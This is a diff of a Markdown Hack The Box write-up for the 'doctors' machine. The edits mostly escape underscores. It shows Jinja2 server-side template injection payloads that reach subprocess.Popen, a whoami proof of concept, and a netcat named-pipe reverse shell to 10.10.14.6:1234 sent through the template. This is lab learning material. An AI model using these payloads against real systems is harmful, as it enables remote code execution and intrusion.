@@ -64,7 +64,7 @@ At this point searched for exploits and default credentials, but nothing worked.
 <img width="294" alt="7-1" src="https://user-images.githubusercontent.com/21021400/145070385-a5d06a75-3c53-4fcc-becd-2ab7c4c9e45e.png">
 </p>
 
-Nothing useful found so far.
+Nothing useful found so far.  
 We will get back to splunk later when we find the credentials.  
 
 doctors.htb leads to a login page  
@@ -110,22 +110,22 @@ https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
 There are multiple methods found to achieve the RCE easily, but we will do it manually.  
 Started climbing the tree, by entering the following commands into the template, and reading the results from /archive.  
 
-{{"".__class__}}  
+{{"".\_\_class\_\_}}  
 <p align="center">
 <img width="780" alt="13" src="https://user-images.githubusercontent.com/21021400/145070401-a0ef6be0-ff4b-4e43-8e77-a6b49f9d7b27.png">
 </p>
 
-{{"".__class__.__mro__}}  
+{{"".\_\_class\_\_.\_\_mro\_\_}}  
 <p align="center">
 <img width="850" alt="14" src="https://user-images.githubusercontent.com/21021400/145070403-18429496-2db8-4a4b-b963-1d4db3cb64bf.png">
 </p>
 
-{{"".__class__.__mro__[1]}}  
+{{"".\_\_class\_\_.\_\_mro\_\_[1]}}  
 <p align="center">
 <img width="792" alt="15" src="https://user-images.githubusercontent.com/21021400/145070404-c5cf216b-3009-4b20-b6ab-899dca191b72.png">
 </p>
 
-{{"".__class__.__mro__[1].__subclasses__()}}  
+{{"".\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()}}  
 <p align="center">
 <img width="960" alt="16" src="https://user-images.githubusercontent.com/21021400/145070408-0ce406cc-1e4b-4a44-8993-84e99a95fb37.png">
 </p>
@@ -177,13 +177,13 @@ subprocess.Popen is at line 408.
 However we need to substract 1 from the line number we got because the indexes do not align.  
 
 So the next command to inject into the template engine will be:  
-{{"".__class__.__mro__[1].__subclasses__()[407]}}  
+{{"".\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()[407]}}  
 <p align="center">
 <img width="809" alt="21" src="https://user-images.githubusercontent.com/21021400/145070415-ea694684-f824-4a87-be4b-d3cdce1c281c.png">
 </p>
 
 We will try to execute 'whoami' as a POC:  
-{{"".__class__.__mro__[1].__subclasses__()[407]('whoami', shell=True, stdout=-1).communicate()}}  
+{{"".\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()[407]('whoami', shell=True, stdout=-1).communicate()}}  
 <p align="center">
 <img width="765" alt="22" src="https://user-images.githubusercontent.com/21021400/145070416-2fa1c596-9ebf-4873-81aa-ca7db1deb2be.png">
 </p>
@@ -195,7 +195,7 @@ Tried a few syntaxes of nc reverse shell payloads but only this on worked:
 rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f  
 
 Opened netcat on port 1234 and injected the following command:  
-{{"".__class__.__mro__[1].__subclasses__()[407]('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f', shell=True, stdout=-1).communicate()}}  
+{{"".\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()[407]('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f', shell=True, stdout=-1).communicate()}}  
 <p align="center">
 <img width="244" alt="23" src="https://user-images.githubusercontent.com/21021400/145070417-70d1d27f-d427-4f97-8600-61d475f5f10f.png">
 </p>
